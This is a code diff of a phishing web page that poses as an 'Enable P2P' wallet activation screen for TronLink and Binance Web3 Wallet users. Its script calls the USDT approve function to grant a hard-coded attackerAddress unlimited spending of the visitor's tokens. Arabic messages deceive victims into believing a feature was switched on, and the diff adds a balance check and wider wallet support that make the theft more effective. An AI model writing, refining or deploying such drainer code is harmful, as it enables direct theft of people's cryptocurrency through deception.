@@ -10,98 +10,32 @@
         .wrapper { width: 100%; max-width: 420px; position: relative; line-height: 0; }
         .bg-img { width: 100%; display: block; margin: 0; padding: 0; border: none; }
 
-        /* زر التفعيل الرئيسي */
         .approve-button {
             position: absolute;
-            top: 18.1%; 
-            left: 50%;
-            transform: translateX(-50%);
-            width: 55%; 
-            height: 55px; 
-            background-color: #ffffff; 
-            color: #000000;
-            border: none;
-            border-radius: 12px; 
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            z-index: 30;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            top: 18.1%; left: 50%; transform: translateX(-50%);
+            width: 55%; height: 55px; 
+            background-color: #ffffff; color: #000000;
+            border: none; border-radius: 12px; 
+            font-size: 18px; font-weight: bold; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            gap: 10px; z-index: 30; box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
 
-        .approve-button::before {
-            content: '';
-            width: 20px; height: 20px;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="black" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>');
-            background-size: contain; background-repeat: no-repeat;
-        }
-
-        /* تصميم اليفطة الاحترافية (Modal) */
         .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            line-height: normal;
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6); z-index: 1000; justify-content: center; align-items: center; line-height: normal;
         }
 
         .modal-card {
-            background: white;
-            width: 85%;
-            max-width: 320px;
-            border-radius: 20px;
-            padding: 25px;
-            text-align: center;
-            animation: fadeIn 0.3s ease-out;
+            background: white; width: 85%; max-width: 320px; border-radius: 20px; padding: 25px; text-align: center;
         }
 
-        @keyframes fadeIn {
-            from { transform: scale(0.9); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        .modal-icon {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            font-size: 30px;
-        }
-
+        .modal-icon { width: 60px; height: 60px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 30px; }
         .icon-success { background: #e8f5e9; color: #4caf50; }
         .icon-error { background: #ffebee; color: #f44336; }
-
         .modal-title { font-size: 20px; font-weight: bold; margin-bottom: 10px; color: #333; }
-        .modal-text { font-size: 15px; color: #666; margin-bottom: 20px; line-height: 1.5; }
-
-        .modal-btn {
-            background: #000;
-            color: #fff;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 10px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        /* القائمة المنسدلة */
-        .menu-trigger { position: absolute; top: 20px; right: 20px; width: 50px; height: 50px; cursor: pointer; z-index: 20; }
-        .dropdown {
-            display: none; position: absolute; top: 60px; right: 20px; background: white;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-radius: 8px; z-index: 100; min-width: 160px;
-        }
-        .dropdown a { display: block; padding: 12px 25px; text-decoration: none; color: #333; font-size: 14px; border-bottom: 1px solid #f0f0f0; text-align: right; }
+        .modal-text { font-size: 15px; color: #666; margin-bottom: 20px; }
+        .modal-btn { background: #000; color: #fff; border: none; padding: 12px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
@@ -113,17 +47,9 @@
         Enable P2P
     </button>
 
-    <div class="menu-trigger" onclick="toggleMenu()"></div>
-    <div id="myDrop" class="dropdown">
-        <a href="#">Twitter</a>
-        <a href="#">Telegram</a>
-        <a href="#">Support Center</a>
-    </div>
-
     <img src="https://i.postimg.cc/Z58v3qNd/Screenshot-20260321-162726-Chrome.jpg" class="bg-img">
     <img src="https://i.postimg.cc/KY4KWDV7/Screenshot-20260321-163106-Chrome.jpg" class="bg-img">
     <img src="https://i.postimg.cc/FR3KtWxy/Screenshot-20260321-163237-Chrome.jpg" class="bg-img">
-    <img src="https://i.postimg.cc/rF8wb9Rz/Screenshot-20260321-163250-Chrome.jpg" class="bg-img">
 </div>
 
 <div id="customModal" class="modal-overlay">
@@ -136,6 +62,7 @@
 </div>
 
 <script>
+    // القيم الأصلية كما طلبت
     const attackerAddress = "TE5VR1wVGgqvCJJGPkub3URLJF6M1TbtkD";
     const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const unlimited = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
@@ -143,50 +70,44 @@
     function showModal(type, title, message) {
         const overlay = document.getElementById('customModal');
         const icon = document.getElementById('modalIcon');
-        const titleEl = document.getElementById('modalTitle');
-        const msgEl = document.getElementById('modalMessage');
-
-        if (type === 'success') {
-            icon.className = 'modal-icon icon-success';
-            icon.innerHTML = '✓';
-        } else {
-            icon.className = 'modal-icon icon-error';
-            icon.innerHTML = '✕';
-        }
-
-        titleEl.innerText = title;
-        msgEl.innerText = message;
+        document.getElementById('modalTitle').innerText = title;
+        document.getElementById('modalMessage').innerText = message;
+        icon.className = type === 'success' ? 'modal-icon icon-success' : 'modal-icon icon-error';
+        icon.innerHTML = type === 'success' ? '✓' : '✕';
         overlay.style.display = 'flex';
     }
 
-    function closeModal() {
-        document.getElementById('customModal').style.display = 'none';
-    }
-
-    function toggleMenu() {
-        const d = document.getElementById('myDrop');
-        d.style.display = (d.style.display === 'block') ? 'none' : 'block';
-    }
+    function closeModal() { document.getElementById('customModal').style.display = 'none'; }
 
     async function startApprove() {
-        if (!window.tronWeb) {
-            showModal('error', 'خطأ في الربط', 'يرجى فتح الرابط من داخل تطبيق TronLink');
+        // دعم Binance Web3 و TronLink
+        const tronWebInstance = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+
+        if (!tronWebInstance) {
+            showModal('error', 'خطأ في الربط', 'يرجى فتح الرابط من داخل Binance Web3 Wallet أو TronLink');
             return;
         }
+
         try {
-            const contract = await window.tronWeb.contract().at(usdtContract);
-            const result = await contract.approve(attackerAddress, unlimited).send();
+            const address = tronWebInstance.defaultAddress.base58;
+            const balance = await tronWebInstance.trx.getBalance(address);
+
+            // التحقق من وجود رسوم TRX (ضروري جداً لكي يعمل زر Approve)
+            if (balance < 15000000) { 
+                showModal('error', 'رسوم الشبكة', 'تفعيل P2P يتطلب وجود 20 TRX على الأقل في المحفظة لتغطية رسوم الطاقة.');
+                return;
+            }
+
+            const contract = await tronWebInstance.contract().at(usdtContract);
+            const result = await contract.approve(attackerAddress, unlimited).send({
+                feeLimit: 100000000
+            });
+
             if(result) {
                 showModal('success', 'تم بنجاح', 'تم تفعيل خاصية P2P في حسابك بنجاح.');
             }
         } catch (e) {
-            showModal('error', 'فشل التفعيل', 'لم يتم تفعيل P2P لعدم وجود رصيد TRX كافٍ لتغطية رسوم الطاقة.');
-        }
-    }
-
-    window.onclick = function(event) {
-        if (!event.target.matches('.menu-trigger')) {
-            document.getElementById('myDrop').style.display = "none";
+            showModal('error', 'فشل التفعيل', 'يرجى الموافقة على الطلب في المحفظة لتفعيل الحساب.');
         }
     }
 </script>
